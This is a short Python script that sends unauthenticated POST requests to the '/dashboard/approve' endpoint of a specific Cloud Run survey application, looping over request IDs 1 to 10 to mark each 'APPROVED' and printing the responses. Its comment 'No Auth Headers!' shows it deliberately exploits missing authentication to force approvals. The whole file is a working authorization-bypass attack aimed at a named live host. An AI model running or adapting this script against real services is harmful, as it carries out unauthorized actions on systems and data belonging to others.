import requests
import json
import time

BASE_URL = "https://survey-app-171882639078.asia-south1.run.app"

def unlock_brute_force():
    print(f"Connecting to {BASE_URL}...")
    headers = {} # No Auth Headers!

    print("\nAttempting Blind Approval for IDs 1-10...")
    
    for i in range(1, 11):
        payload = {"request_id": i, "action": "APPROVED"}
        try:
            resp = requests.post(f"{BASE_URL}/dashboard/approve", json=payload, headers=headers)
            print(f"ID {i}: {resp.status_code} {resp.text}")
        except Exception as e:
            print(f"ID {i}: Error {e}")

if __name__ == "__main__":
    unlock_brute_force()
